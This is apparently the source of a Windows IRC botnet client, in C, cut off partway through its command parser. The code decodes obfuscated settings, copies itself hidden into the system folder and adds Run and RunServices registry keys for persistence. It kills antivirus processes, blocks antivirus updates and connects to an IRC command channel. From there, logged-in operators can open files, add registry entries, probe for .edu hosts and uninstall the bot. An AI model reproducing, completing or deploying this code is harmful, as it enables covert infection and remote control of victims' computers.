#include <stdio.h>
#include <windows.h>
#include <wininet.h>
#include <string.h>
#include "../../Inc/client.h"
#include "../../Inc/SDX.h"
#include "../../Inc/config.h"
#include "../../Inc/Utilities.h"

#define WIN32_LEAN_AND_MEAN
#pragma warning(disable:4035)
#pragma comment(linker,"/OPT:NOWIN98")

// irc structure.
typedef struct ircs {
	char host[128];
	int port;
	char channel[64];
	char chanpass[64];
	char hchan[64];
	char nick[16];
	SOCKET sock;
	int spy;
	int threadnum;
	BOOL gotinfo;
} ircs;

// download/update structure
typedef struct ds {
	char url[256];
	char dest[256];
	char chan[128];
	SOCKET sock;
	int run;
	int threadnum;
	int update;
	BOOL silent;
	BOOL gotinfo;
} ds;

// icmp.dll typedefs/structs
typedef unsigned long IPAddr;

// kernel32.dll typedefs/structs
typedef struct tagPROCESSENTRY32 {
	DWORD dwSize;
	DWORD cntUsage;
	DWORD th32ProcessID;
	DWORD *th32DefaultHeapID;
	DWORD th32ModuleID;
	DWORD cntThreads;
	DWORD th32ParentProcessID;
	LONG pcPriClassBase;
	DWORD dwFlags;
	CHAR szExeFile[MAX_PATH];
} PROCESSENTRY32, *LPPROCESSENTRY32;

// wininet.dll function variables
typedef int (__stdcall *IGCSE)(LPDWORD, char *, DWORD, DWORD);
IGCSE fInternetGetConnectedStateEx;
typedef int (__stdcall *IGCS)(LPDWORD, DWORD);
IGCS fInternetGetConnectedState;

// kernel32.dll function variables
typedef int (__stdcall *RSP)(DWORD, DWORD);
RSP fRegisterServiceProcess;
typedef HANDLE (__stdcall *CT32S)(DWORD,DWORD);
CT32S fCreateToolhelp32Snapshot;
typedef BOOL (__stdcall *P32F)(HANDLE,LPPROCESSENTRY32);
P32F fProcess32First;
typedef BOOL (__stdcall *P32N)(HANDLE,LPPROCESSENTRY32);
P32N fProcess32Next;

// function prototypes (not really neccesary, but this way i can put the functions in any order i want)
char * decryptstr(char *str, int strlen);
void addlog(char *desc);
int addthread(char *desc);
DWORD WINAPI irc_connect(LPVOID param);
char * rndnick(char *strbuf);
int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy);
int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char *host, int *in_channel, int repeat);
void irc_send(SOCKET sock, char *msg);
void irc_sendf(SOCKET sock, char *msg, char *str);
void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2);
void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice);
char * replacestr(char *str, char *oldstr, char *newstr);
DWORD WINAPI webdownload(LPVOID param);
void uninstall(void);

// global variables
HANDLE ih;              // internet handle
ircs mainirc;           // main irc structure
char prefix1 = prefix;  // prefix variable
HANDLE threads[64];     // thread handles
char threadd[64][128];  // thread descriptions
SOCKET csock[64];       // thread sockets
char cnick[64][16];     // thread nicks
char log[128][128];     // log entries
DWORD w;                // DWORD used for various stuff
BOOL success = FALSE;   // if true then we made successful connect attempt
char tempdir[256];      // name of temp folder
char pbuff[65500];      // packet buffer
BOOL noicmp;            // if true, icmp.dll is available
BOOL noigcse;           // if true, InternetGetConnectedStateEx function is available
DWORD started;          // time bot was started
/*
char *getip(int s)
{
	char *ptr;
	struct sockaddr_in *sin;
	int len;
	len = sizeof(struct sockaddr_in);
	sin = (sockaddr_in*)malloc(len);
	if (getpeername(s, (struct sockaddr *)sin, &len) >= 0 && (sin != NULL))
	{
		ptr = strdup(inet_ntoa(sin->sin_addr));
		free(sin);
		return(ptr);
	}
	return NULL;
}
*/
void AddRegRun(const char *v, const unsigned char *f)
{
	HKEY key;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegSetValueEx(key, v, 0, REG_SZ, f, strlen((const char *)f));
	RegCloseKey(key);
	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegSetValueEx(key, v, 0, REG_SZ, f, strlen((const char *)f));
	RegCloseKey(key);
}

void AddRegRunService(const char *v, const unsigned char *f)
{
	HKEY key;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegSetValueEx(key, v, 0, REG_SZ, f, strlen((const char *)f));
	RegCloseKey(key);
	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegSetValueEx(key, v, 0, REG_SZ, f, strlen((const char *)f));
	RegCloseKey(key);
}

void dc (char *str)
{
	for (BYTE i = 0; str[i] != '\0'; i++)
		str[i] = str[i] ^ (cryptkey + (i * (cryptkey % 10) + 1));
}

bool FileExists (char *filename)
{
	WIN32_FIND_DATA finddata;
	HANDLE handle = FindFirstFile(filename,&finddata);
	return (handle != INVALID_HANDLE_VALUE);
}

// program starts here
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	loginTest();
	WSADATA wsadata;
	int i = 0, err = 0;
	char cfilename[256];
	char filename1[64];
	char sysdir[256];
	char tstr[256];
	DWORD cstat;
    HANDLE psnap;
    PROCESSENTRY32 pe32 = {0};
	int copies = 0;
	BOOL bkpserver = FALSE;
	BOOL noigcs;

	// record start time
	started = GetTickCount() / 1000;

	// decode settings
	dc(botid);
	dc(server);
	dc(serverpass);
	dc(channel);
	dc(chanpass);
	dc(server2);
	dc(channel2);
	dc(chanpass2);
	dc(filename);
	dc(valuename);
	dc(version);

	strcpy(MyFile, filename);

	// load functions from kernel32.dll and hide from the windows 9x task manager
	HINSTANCE kernel32_dll = LoadLibrary("kernel32.dll");
	if (kernel32_dll) {
		fRegisterServiceProcess = (RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");
		fCreateToolhelp32Snapshot = (CT32S)GetProcAddress(kernel32_dll, "CreateToolhelp32Snapshot");
		fProcess32First = (P32F)GetProcAddress(kernel32_dll, "Process32First");
		fProcess32Next = (P32N)GetProcAddress(kernel32_dll, "Process32Next");

		if (fRegisterServiceProcess) fRegisterServiceProcess(0, 1);
	}

	// initialize wininet stuff
	ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (ih == NULL) ih = 0;
	// see if InternetGetConnectedStateEx is available
	HINSTANCE wininet_dll = LoadLibrary("WININET.DLL");
    if (wininet_dll == 0) noigcse = TRUE;
 	else {
		fInternetGetConnectedState = (IGCS)GetProcAddress(wininet_dll, "InternetGetConnectedState");
		if (!fInternetGetConnectedState) {
			noigcs = TRUE;
		} else noigcs = TRUE;

	 	fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
 		if (!fInternetGetConnectedStateEx) {
	        noigcse = TRUE;
	    } else noigcse = FALSE;
	}

	// get our file name and the path to the temp folder
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	GetTempPath(sizeof(tempdir), tempdir);

	// check if this exe is running already
	if (fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next) {
		psnap = fCreateToolhelp32Snapshot(2, 0);
		if (psnap != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (fProcess32First(psnap, &pe32)) {
				do {
					if (strncmp(cfilename+(strlen(cfilename)-strlen(pe32.szExeFile)), pe32.szExeFile, strlen(pe32.szExeFile)) == 0) copies++;
				} while (fProcess32Next(psnap, &pe32));
			}
			CloseHandle (psnap);
			// if this exe has already been run, then exit
			if (copies > 1) exit(0);
		}
	}

	err = WSAStartup(MAKEWORD(1, 1), &wsadata);
	if (err != 0) return 0;
	if ( LOBYTE( wsadata.wVersion ) != 1 || HIBYTE( wsadata.wVersion ) != 1 ) {
		WSACleanup();
		return 0;
	}


	srand(GetTickCount());
	if (rndfilename) rndnick((char *)&filename); else strncpy(filename1, filename, sizeof(filename1)-1);

	if (Sysdir == 1)
		GetSystemDirectory(sysdir, sizeof(sysdir));
	else
		GetWindowsDirectory(sysdir, sizeof(sysdir));
	sprintf(tstr, "\\%s", filename1);
	strcat(sysdir, tstr);

	if (strstr(cfilename, sysdir) == NULL) {
		Sleep(1000);
		if (FileExists(sysdir))
		{
			SetFileAttributes((LPCSTR)sysdir,FILE_ATTRIBUTE_NORMAL);
			remove(sysdir);
		}
		while (CopyFile(cfilename, sysdir, FALSE) == FALSE) Sleep(2000);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;
		WSACleanup();
		if (CreateProcess(NULL, sysdir, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo))
		{
			// change file attributes so its hidden
			if (hidefile)
			{
				SetFileAttributes((LPCSTR)sysdir,FILE_ATTRIBUTE_NORMAL);
				SetFileAttributes((LPCSTR)sysdir,FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY);
			}
			exit(0);
		}
	}

	if (regrun) {
		AddRegRun((const char *)valuename, (const unsigned char *)filename1);
		AddRegRunService((const char *)valuename, (const unsigned char *)filename1);
	}

	memset(threadd, 0, sizeof(threadd));
	memset(cnick, 0, sizeof(cnick));

	addthread("main thread");

	memset(log, 0, sizeof(log));
	addlog("bot started.");

	#ifndef NO_AVKILL
	int avkill = KillProcess(NULL);

	if (avkill)
		addlog("Killed dangerous processes.");
	else
		addlog("Failed to kill dangerous processes.");
	#endif

	#ifndef NO_AVUPD
	int denyupds = AddHosts();

	if (avkill)
		addlog("Denied AV Updates.");
	else
		addlog("Failed to deny AV Updates.");
	#endif

	// copy settings into main irc structure
	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	mainirc.spy = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
			#ifndef NO_CONNCHECK
			// check if we're connected to the internet... if not, then wait 5mins and try again
			if (!noigcs) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
			#endif

			err = irc_connect((void *)&mainirc);
			success = FALSE;
			if (err == 2) break; // break out of the loop
			if (success) i--; // if we're successful in connecting, decrease i by 1;

			// irc_connect didn't return 2, so we need to sleep then reconnect
			Sleep(3000);
		}

		if (err == 2) break; // break out of the loop and close

		if (bkpserver) {
			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		else if (!bkpserver && server2[0] != '\0') {
		    strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
			mainirc.port = port2;
			strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
			bkpserver = TRUE;
		}
	}

	// cleanup;
	for (i = 0; i < 64; i++) closesocket(csock[i]);
	WSACleanup();

	return 0;
}

// function to add a log item
void addlog(char *desc)
{
	SYSTEMTIME st;

	GetLocalTime(&st);

	for (int i = 126; i >= 0; i--) if (log[i][0] != '\0') strncpy(log[i+1], log[i], sizeof(log[i+1])-1);
	sprintf(log[0], "[%d-%d-%d %d:%d:%d] %s", st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond, desc);
}

// function to add description to thread list and return thread number
int addthread(char *desc)
{
	int i;
	for (i = 0; i < 64; i++) {
		if (threadd[i][0] == '\0') {
			strncpy(threadd[i], desc, sizeof(threadd[i])-1);
			break;
		}
	}
	return i;
}

// connect function used by the original bot and all clones/spies
DWORD WINAPI irc_connect(LPVOID param)
{
	SOCKET sock;
	SOCKADDR_IN ssin;
	IN_ADDR iaddr;
	LPHOSTENT hostent;
	DWORD err;
	int rval;
	char nick[16];
	char *nick1;
	char str[64];
	BYTE spy;
	ircs irc;

	irc = *((ircs *)param);
	ircs *ircp = (ircs *)param;
	ircp->gotinfo = TRUE;

	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons(irc.port);
		iaddr.s_addr = inet_addr(irc.host);
		if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(irc.host);
		else hostent = gethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
		if (hostent == NULL) return 0;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);

		memset(nick, 0, sizeof(nick));
		if (irc.spy == 1) nick1 = irc.nick; else {
			nick1 = rndnick(nick);
		}
		sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		csock[irc.threadnum] = sock;
		err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) {
			closesocket(sock);
			Sleep(2000);
			continue;
		}

		sprintf(str, "connected to %s.", irc.host);
		addlog(str);

		strncpy(cnick[irc.threadnum], nick1, sizeof(cnick[irc.threadnum])-1);

		if (irc.spy == 1) spy = 1; else spy = 0;
		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, spy);
		closesocket(sock);

		if (rval == 0) continue;
		if (rval == 1) {
			Sleep(180000);
			continue;
		}
		if (rval == 2) break;
	}

	threads[irc.threadnum] = 0;
	threadd[irc.threadnum][0] = '\0';
	cnick[irc.threadnum][0] = '\0';
	return rval;
}

char * rndnick(char *strbuf)
{
	int n, nl;
	char nick[12], fnick[18];
#ifndef NO_RNDNICK

	srand(GetTickCount());
	memset(nick, 0, sizeof(nick));
	nl = (rand()%8)+3;
	for (n=0; n<nl; n++) nick[n] = (rand()%26)+97;
	nick[n+1] = '\0';

	strncpy(strbuf, nick, 12);
#else
	char szUid[100];
	DWORD nUname = sizeof(szUid);

	GetUserName(szUid, &nUname)
           ;
	srand(GetTickCount());
	memset(nick, 0, sizeof(nick));
	sprintf(nick, "%i", 100 + rand()%9899);
	nick[sizeof(nick)+1] = '\0';
	szUid[7] = '\0';
	strcpy(strbuf, szUid);
	strcat(strbuf, nick);
#endif
#ifndef NO_OSNICK
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) strcpy(fnick, "[95]");
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) strcpy(fnick, "[NT]");
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) strcpy(fnick, "[98]");
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) strcpy(fnick, "[ME]");
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) strcpy(fnick, "[2K]");
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) strcpy(fnick, "[XP]");
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) strcpy(fnick, "[2003]");
	strcat(fnick, strbuf);
	strcpy(strbuf, fnick);
	return strbuf;
#else
	return strbuf;
#endif
}

BOOL CALLBACK enumProc(HWND hwnd, LPARAM lParam)
{
	char Buffer[2048];
//	GetWindowText(hwnd, Buffer, 2048);
	SendMessage(hwnd, EM_GETLINE, NULL, (long)&Buffer);
	char *pCDKey=(char*)lParam;
	if(strstr(Buffer, "-")) sprintf(pCDKey, "%s", Buffer);
	return TRUE;
}


// receive loop for bots/spies
int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy)
{
	// main receive buffer
	char buff[4096];
	int err, repeat;
	char *b;
	char str[18];
	char login[64];
	char line[512];
	int in_channel;

	repeat = 0;


	if (serverpass[0] != '\0') {
		sprintf(login, "PASS %s\r\n", serverpass);
		send(sock, login, strlen(login), 0);
	}
	sprintf(login, "NICK %s\r\n"
				   "USER %s 0 0 :%s\r\n", nick1, rndnick(str), nick1);
	err = send(sock, login, strlen(login), 0);
	if (err == SOCKET_ERROR) {
		closesocket(sock);
		Sleep(5000);
		return 0;
	}

	// loop forever
	while(1) {
		char host[160];

		memset(buff, 0, sizeof(buff));
		err = recv(sock, buff, sizeof(buff), 0);
		// if recv() returns 0, that means that the connection has been lost.
		if (err == 0) break;
		// if recv() returns SOCKET_ERROR then we've probably terminated the connection.
		if (err == SOCKET_ERROR) break;

		// split lines up if multiple lines received at once, and parse each line
		memset(line, 0, sizeof(line));
		b = strtok(buff, "\r");
		if (b != NULL) strncpy(line, b, sizeof(line)-1);
		while (b != NULL) {
			if(line)
			{
				if (spy == 0) {
					repeat = 1;
					do {
						// repeat--;
						repeat = irc_parseline(line, sock, channel, chanpass, nick1, server, host, &in_channel, repeat);
						repeat--;
					} while (repeat > 0);
					//if (repeat-- > 0) while (repeat-- > 0) irc_parseline(b[n-1], sock, channel, chanpass, nick1, in_channel, repeat);
					if (repeat == -1) return 0;
					else if (repeat == -2) return 1;
					else if (repeat == -3) return 2;
				}
			}

			b = strtok(b+strlen(b)+1, "\r");
			//if (b != NULL) if (b[strlen(b)+2] != '\n' && b[strlen(b)+3] != '\0') strncpy(line, b+1, sizeof(line)-1); else b = NULL;
			if (b != NULL) strncpy(line, b+1, sizeof(line)-1); else b = NULL;
		}
	}

	return 0;
}

// function to parse lines for the bot and clones
int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char *host, int *in_channel, int repeat)
{
	char line1[512];
	char line2[512];
	BOOL ismaster;
	char ntmp[12];
	char ntmp2[3];
	int i, s;
	char *a[32];
	char a0[128];
	char nick[18];
	char user[24];
	char sendbuf[512];
	DWORD id;
	BOOL silent = FALSE;
	BOOL notice = FALSE;
	BOOL usevars = FALSE;
	int cl;

	if(line == "") return 1;

	memset(sendbuf, 0, sizeof(sendbuf));

	id = 0;
	strncpy(nick, nick1, sizeof(nick)-1);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");

	// split the line up into seperate words
	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL) return 1;

	//check for 'silent' parameter
	for (i = 3; i < 32; i++) if (a[i] == NULL && a[i-1] != NULL) {
		if (strcmp(a[i-1], "-s") == 0) silent = TRUE;
		break;
	}

	//check for 'notice' parameter
	for (i = 3; i < 32; i++) if (a[i] == NULL && a[i-1] != NULL) {
		if (strcmp(a[i-1], "-n") == 0) notice = TRUE;
		break;
	}

	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}
	// pong if we get a ping request from the server
	if (strcmp("PING", a[0]) == 0) {
		irc_sendf(sock, "PONG :%s\r\n", a[1]+1);
		if (in_channel == 0) {
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}

	// looks like we're connected to the server, let's join the channel
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0 || strcmp("422", a[1]) == 0) {
		irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		irc_sendf(sock, "USERHOST %s\r\n", nick1); // get our hostname
		success = TRUE;
		return 1;
	}

	// get host
	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL) strncpy(host,  h+1, 159);
		return 1;
	}

	// nick already in use
	if (strcmp("433", a[1]) == 0) {
		rndnick(nick1);
		irc_sendf(sock, "NICK %s\r\n", nick1);
		return 1;
	}

	// check if user is logged in
	ismaster = FALSE;
	if(llStart) if(llStart->next)
	{
		if(FindLogin(strtok(strtok(a0, "!"), ":"), llStart)) 
			ismaster = TRUE;
	}

	//rejoin channel if we're kicked, otherwise reset master if it was our master that got kicked
	if (strcmp("KICK", a[1]) == 0) {

		if (strcmp(nick1, a[3]) == 0) {
			in_channel = 0;
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
			/*sprintf(sendbuf, "screw you %s!", user);
			irc_privmsg(sock, a[2], sendbuf, FALSE);*/
		}
		return 1;
	}

	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user;
		char *newnck = a[2] + 1;
		if (oldnck != NULL && newnck != NULL)  {
			if (strcmp(oldnck, nick1) == 0) strncpy(nick1,  newnck, 15);
		}
		return 1;
	}

	// reset master if master parts or quits
	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) if(FindLogin(a[0], llStart)) {
			DelLogin("", a[0], llStart);
			/*
			sprintf(sendbuf, "user %s logged out.", user);
			addlog(sendbuf);
			if (strcmp("PART", a[1]) == 0) irc_sendf2(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
			*/
			return 1;
	}

	// we've successfully joined the channel
	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0) *in_channel = 1;
		/*sprintf(sendbuf, "joined channel %s.", a[4]);
		addlog(sendbuf);*/
		return 1;
	}

	// if we get a privmsg, notice or topic command, start parsing it
	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
			if (strcmp("NOTICE", a[1]) == 0) notice = TRUE;
			if (a[2] == NULL) return 1;
			if (strstr(a[2], "#") == NULL || notice) a[2] = user;
			if (a[3] == NULL) return 1;
			a[3]++;
			if (a[3] && nick1) if (strncmp(nick1, a[3], strlen(nick1)) == 0) s = 4; else s = 3;
			// if our nick is the first part of the privmsg, then we should look at a[4] for a command, a[3] otherwise.
			if (a[s] == NULL) return 1;
			// if someone asks for our version, send version reply
			if (strcmp("\1VERSION\1", a[s]) == 0) if (a[2][0] != '#' && version[0] != '\0') {
				irc_sendf2(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)version);
				return 1;
			}
			else if (strcmp("\1PING", a[s]) == 0) if (a[s+1] != NULL && a[2][0] != '#') {
				irc_sendf2(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
				return 1;
			}
		} else  { // it's a topic command
			s = 4;
			a[4]++;
			a[2] = a[3];
		}

		if (a[s]++[0] != prefix1) return 1;
		// see if someone is logging in
		user_list_t *ulTemp = ulStart->next; bool login = false;
		while(ulTemp) { if(!strcmp(ulTemp->logincmd, a[s])) { login=true; break; } else login=false; ulTemp=ulTemp->next; }
		if (login) {
			if (a[s+1] == NULL) return 1;
			if (a[s+2] == NULL) return 1;
			char *u = strtok(a[0], "!") + 1;
			char *h = strtok(NULL, "\0");
			if(AddLogin(a[s+1], a[s+2], u, ulStart, llStart))
			{
				if (!silent) irc_privmsg(sock, a[2], "[MAC] Password accepted.", notice);
				sprintf(sendbuf, "user %s(%s) logged in.", u, h);
				addlog(sendbuf);
				return 1;
			}
		}
		if (ismaster || strcmp("332", a[1]) == 0) {
			// commands requiring no parameters
			if (a[s][0] == prefix1 || usevars) {
				// process variables
				replacestr(line, "$me", nick1); // bot's nick
				replacestr(line, "$user", user); // user's nick
				replacestr(line, "$chan", a[2]); // channel name (or user name if this is a privmsg to the bot)
				replacestr(line, "$rndnick", rndnick(ntmp)); // random string of 4-7 characters
				replacestr(line, "$server", server); // name of current server

				// process '$chr()' variables
				while (strstr(line, "$chr(") != NULL) {
					char *c = strstr(line, "$chr(");
					strncpy(ntmp, c+5, 4);
					strtok(ntmp, ")");
					if (ntmp[0] < 48 || ntmp[0] > 57)  strncpy(ntmp, "63", 3);
					if (atoi(ntmp) > 0) ntmp2[0] = atoi(ntmp); else ntmp2[0] = (rand()%96) + 32;
					ntmp2[1] = '\0';
					cl = strlen(ntmp);
					memset(ntmp, 0, sizeof(ntmp));
					strncpy(ntmp, c, cl+6);
					replacestr(line, ntmp, ntmp2);
				}

				// re-split the line into seperate words
				strncpy(line1, line, sizeof(line1)-1);
				strncpy(line2, line1, sizeof(line2)-1);
				a[0] = strtok(line2, " ");
				for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");
				if (a[s] == NULL) return 1;
				a[s] += 3;
			}

			if (strcmp("randnick", a[s]) == 0 || strcmp("rn", a[s]) == 0) {
				if(CheckBadFunc("randnick", FindUser(user, ulStart))) return 1;
				rndnick(nick);
				irc_sendf(sock, "NICK %s\r\n", nick);
			}
			else if (strcmp("die", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				if(CheckBadFunc("die", FindUser(user, ulStart))) return 1;
				if (strcmp("332", a[1]) != 0) exit(0);
			}
			else if (strcmp("reconnect", a[s]) == 0 || strcmp("rc", a[s]) == 0) {
				if(CheckBadFunc("reconnect", FindUser(user, ulStart))) return 1;
				irc_send(sock, "QUIT :reconnecting");
				return 0;
			}
			else if (strcmp("disconnect", a[s]) == 0 || strcmp("dc", a[s]) == 0) {
				if(CheckBadFunc("disconnect", FindUser(user, ulStart))) return 1;
				irc_send(sock, "QUIT :later");
				return -1;
			}
			else if (strcmp("quit", a[s]) == 0 || strcmp("q", a[s]) == 0) {
				if(CheckBadFunc("quit", FindUser(user, ulStart))) return 1;
				if (a[s+1] == NULL) irc_send(sock, "QUIT :later\r\n"); else {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendf(sock, "QUIT :%s\r\n", y);
					}
				}
				return -2;
			}
			else if (strcmp("getedu", a[s]) == 0 || strcmp("ge", a[s]) == 0) {
				if(strstr(host, ".edu")) irc_privmsg(sock, a[2], "[NET] Host found", notice);
			}
			else if (strcmp("id", a[s]) == 0 || strcmp("i", a[s]) == 0) irc_privmsg(sock, a[2], (char *)botid, notice);
			else if (strcmp("log", a[s]) == 0 || strcmp("lg", a[s]) == 0) {
				if(CheckBadFunc("log", FindUser(user, ulStart))) return 1;
				for (i = 0; i < 128; i++) {
					if (log[i][0] != '\0') {
						irc_privmsg(sock, a[2], log[i], notice);
					}
				}
			}
			else if (strcmp("rm", a[s]) == 0) {
				if(CheckBadFunc("remove", FindUser(user, ulStart))) return 1;
				if (!silent) irc_privmsg(sock, a[2], "[MAIN] Removing bot...", notice);
				uninstall();
				WSACleanup();
				exit(0);
			}
			// commands requiring at least 1 parameter
			else if (a[s+1] == NULL) return 1;
			else if (strcmp("logout", a[s]) == 0) {
				if(strcmp(a[s+1], ""))
				{	if(CheckBadFunc("logout", FindUser(user, ulStart))) return 1;
					DelLogin(a[s+1], user, llStart);
					sprintf(sendbuf, "[MAC] user %s logged out.\r\n", user);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf); }
			}
			else if (strcmp("prefix", a[s]) == 0 || strcmp("pr", a[s]) == 0) {
				if(CheckBadFunc("prefix", FindUser(user, ulStart))) return 1;
				prefix1 = a[s+1][0]; }
			else if (strcmp("open", a[s]) == 0 || strcmp("o", a[s]) == 0) {
				if(CheckBadFunc("open", FindUser(user, ulStart))) return 1;
				if (ShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW)) {
					if (!silent) irc_privmsg(sock, a[2], "[MAIN] File opened.", notice);
				} else {
					if (!silent) irc_privmsg(sock, a[2], "[MAIN] couldn't open file.", notice);
				}
			}
			else if (strcmp("dns", a[s]) == 0 || strcmp("dn", a[s]) == 0) {
				if(CheckBadFunc("dns", FindUser(user, ulStart))) return 1;
				HOSTENT *hostent = NULL;
				IN_ADDR iaddr;
				DWORD addr = inet_addr(a[s+1]);

				if (addr != INADDR_NONE) {
					hostent = gethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
					if (hostent != NULL) {
						sprintf(sendbuf, "[NET] %s -> %s", a[s+1], hostent->h_name);
					  	irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
				else {
					hostent = gethostbyname(a[s+1]);
					if (hostent != NULL) {
						iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
						sprintf(sendbuf, "[NET] %s -> %s", a[s+1], inet_ntoa(iaddr));
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
				if (hostent == NULL) irc_privmsg(sock, a[2], "[NET] couldn't resolve host", notice);
			}
			// commands requiring at least 2 parameters
			else if (a[s+2] == NULL) return 1;
			else if (strcmp("addreg", a[s]) == 0) {
				AddRegRun(a[s+1], (const unsigned char*)a[s+2]);
				AddRegRunService(a[s+1], (const unsigned char*)a[s+2]);
			}
			else if (strcmp("mode", a[s]) == 0 || strcmp("m", a[s]) == 0) {
				if(CheckBadFunc("mode", FindUser(user, ulStart))) return 1;
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_sendf(sock, "MODE %s\r\n", y);
				}
			}
			else if (strcmp("up", a[s]) == 0) {
				if(CheckBadFunc("update", FindUser(user, ulStart))) return 1;
